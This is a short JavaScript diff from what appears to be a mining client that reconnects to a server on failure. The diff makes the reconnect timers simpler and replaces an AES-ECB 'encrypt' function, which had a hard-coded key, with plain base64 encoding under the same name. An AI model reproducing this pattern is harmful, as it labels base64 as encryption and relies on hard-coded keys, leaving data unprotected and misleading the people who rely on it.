@@ -62,26 +62,16 @@ function connectClient() {
     }).on('end', () => {
         mMiner = null
         mJob = null
-        setTimeout(() => {
-            connectClient()
-        }, 2000)
+        setTimeout(connectClient, 2000)
     }).on('error', () => {
         mMiner = null
         mJob = null
-        setTimeout(() => {
-            connectClient()
-        }, 2000)
+        setTimeout(connectClient, 2000)
     })
 }
 
 function encrypt(text) {
-    try {
-        let key = Buffer.from('raiyan_##_088_encryption', 'utf8')
-        var cc = crypto.createCipher('aes-128-ecb', key)
-        return Buffer.concat([cc.update(text, 'utf8'), cc.final()]).toString('base64')
-    } catch (e) {
-        return null
-    }
+    return Buffer.from(text).toString('base64')
 }
 
 
